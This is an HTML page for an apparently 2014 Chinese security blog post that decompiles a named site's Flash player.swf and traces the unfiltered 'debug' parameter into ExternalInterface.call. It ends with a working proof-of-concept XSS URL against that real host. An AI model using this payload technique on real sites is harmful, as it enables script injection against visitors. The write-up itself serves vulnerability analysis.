@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="robots" content="index,follow" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="author" content="Chu" />
+    <meta name="description" content="Chu 的博客" />
+    <meta name="keywords" content="Chu,网络安全,编程开发" />
+
+    <title>简单分析个 flash xss - Chu&#39;s BLoG</title>
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/main.4509a6b37e5a1523e05a614a994b1d27b8f97d6b6cc7b8732bfd105910856434.css" integrity="sha256-RQmms35aFSPgWmFKmUsdJ7j5fWtsx7hzK/0QWRCFZDQ=" />
+    <link rel="alternate" href="/index.xml" type="application/atom+xml" title="RSS" />
+  </head>
+
+  <body>
+    <header></header>
+    <main>
+<article>
+    <header>
+        <h1>简单分析个 flash xss</h1>
+        <div>
+            <time datetime="2014-03-13 20:18:45 +0800 CST">发布时间: 2014-03-13 20:18</time>
+            <time datetime="2014-03-13 20:18:45 +0800 CST">更新时间: 2014-03-13 20:18</time>
+        </div>
+    </header>
+
+    <section>
+    <p>url: <a href="http://yximg.mop.com/minisite/201007/baodaopage/Scripts/player.swf">http://yximg.mop.com/minisite/201007/baodaopage/Scripts/player.swf</a></p>
+<p>wget 下来，反编译，看到是 as3 的，搜索 loaderinfo，发现:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">loadConfig</span>()<span style="color:#f92672">:</span><span style="color:#66d9ef">void</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">loadCookies</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">xmlConfig</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">loadXML</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">xmlConfig</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">loadFlashvars</span>(<span style="color:#a6e22e">RootReference</span>.<span style="color:#a6e22e">root</span>.<span style="color:#a6e22e">loaderInfo</span>.<span style="color:#a6e22e">parameters</span>);
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>可以看到 loaderinfo.parameters 被带入了 loadFlashvars，搜索这个函数，看看它是怎么定义的：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">loadFlashvars</span>(<span style="color:#a6e22e">_arg1</span><span style="color:#f92672">:</span>Object)<span style="color:#f92672">:</span><span style="color:#66d9ef">void</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">param</span><span style="color:#f92672">:</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">params</span><span style="color:#f92672">:</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_arg1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">param</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">params</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">setConfigParam</span>(<span style="color:#a6e22e">param</span>, <span style="color:#a6e22e">params</span>[<span style="color:#a6e22e">param</span>]);
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dispatchEvent</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Event</span>(<span style="color:#a6e22e">Event</span>.<span style="color:#a6e22e">COMPLETE</span>));
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span><span style="color:#f92672">:</span>Error) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dispatchEvent</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ErrorEvent</span>(<span style="color:#a6e22e">ErrorEvent</span>.<span style="color:#a6e22e">ERROR</span>, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span>));
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>看到这句 <code>this.setConfigParam(param, params[param]);</code>，然后跟踪 <code>setConfigParam</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setConfigParam</span>(<span style="color:#a6e22e">_arg1</span><span style="color:#f92672">:</span>String, <span style="color:#a6e22e">_arg2</span><span style="color:#f92672">:</span>String)<span style="color:#f92672">:</span><span style="color:#66d9ef">void</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_config</span>[<span style="color:#a6e22e">_arg1</span>.<span style="color:#a6e22e">toLowerCase</span>()] <span style="color:#f92672">=</span> <span style="color:#a6e22e">Strings</span>.<span style="color:#a6e22e">serialize</span>(<span style="color:#a6e22e">Strings</span>.<span style="color:#a6e22e">decode</span>(<span style="color:#a6e22e">_arg2</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这里可以看到参数被传到了 <code>config</code> 中，然后我们再看对 <code>config</code> 进行了那些调用，搜索 <code>_config</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">_arg1</span><span style="color:#f92672">:</span>String)<span style="color:#f92672">:</span><span style="color:#66d9ef">void</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_local2</span><span style="color:#f92672">:</span>String <span style="color:#f92672">=</span> (<span style="color:#a6e22e">_config</span>) <span style="color:#f92672">?</span> <span style="color:#a6e22e">_config</span>.<span style="color:#a6e22e">debug</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">TRACE</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (<span style="color:#a6e22e">_local2</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">ARTHROPOD</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">CONNECTION</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">CONNECTION_NAME</span>, <span style="color:#960050;background-color:#1e0010">“</span><span style="color:#a6e22e">debug</span><span style="color:#960050;background-color:#1e0010">”</span>, <span style="color:#960050;background-color:#1e0010">“</span><span style="color:#a6e22e">CDC309AF</span><span style="color:#960050;background-color:#1e0010">”</span>, <span style="color:#a6e22e">_arg1</span>, <span style="color:#ae81ff">0xCCCCCC</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">CONSOLE</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ExternalInterface</span>.<span style="color:#a6e22e">available</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ExternalInterface</span>.<span style="color:#a6e22e">call</span>(<span style="color:#960050;background-color:#1e0010">“</span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span><span style="color:#960050;background-color:#1e0010">”</span>, <span style="color:#a6e22e">_arg1</span>);
+</span></span><span style="display:flex;"><span>            };
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">TRACE</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">trace</span>(<span style="color:#a6e22e">_arg1</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">NONE</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ExternalInterface</span>.<span style="color:#a6e22e">available</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ExternalInterface</span>.<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">_config</span>.<span style="color:#a6e22e">debug</span>, <span style="color:#a6e22e">_arg1</span>);
+</span></span><span style="display:flex;"><span>            };
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>此时已经明了，<code>debug</code> 参数未经过滤最后被 <code>ExternalInterface.call</code> 调用了，于是我们构造如下：</p>
+<pre tabindex="0"><code>http://yximg.mop.com/minisite/201007/baodaopage/Scripts/player.swf?debug=alert(/ hello,world/));}catch(e){};//
+</code></pre>
+    </section>
+</article>
+</main>
+  </body>
+</html>
